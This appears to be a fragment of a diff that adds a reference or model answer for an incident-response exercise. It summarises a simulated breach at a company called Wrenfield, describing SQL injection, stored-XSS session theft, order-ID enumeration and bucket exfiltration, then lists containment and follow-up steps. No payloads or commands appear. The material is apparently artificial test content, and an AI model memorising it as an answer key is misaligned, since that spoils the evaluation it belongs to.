+  "model": "Real incident, one attacker (203.0.113.90). Overnight, SQL injection against /products ran a UNION that read email and password_hash from the users table (the WAF only logged it). This morning, a stored XSS script in review REV-8842 stole admin s.okafor's session cookie when she opened the review queue; the attacker reused it from 203.0.113.90, read customer orders by walking IDs (broken access control), and opened Integrations, where the app's storage key is shown. At 09:41 that key (AKIA-WRENFIELD-APP) was used from 203.0.113.90 to download 4.8 GB of customer exports from wrenfield-exports: the breach. Contained: WAF rule added for the injection, review removed, s.okafor reset with sessions ended, 203.0.113.90 blocked, the storage key revoked and rotated and the bucket locked to the app server, Nadia told to run the breach process. Noise: the approved overnight scan (CHG-5210) and the scheduled analytics export (svc-analytics). Next shift: get dev to ship parameterised queries, output encoding and order ownership checks, move the app to short-lived cloud credentials, and treat the exposed customer data and password hashes as breached (forced resets, ICO assessment)."
+ }
+}
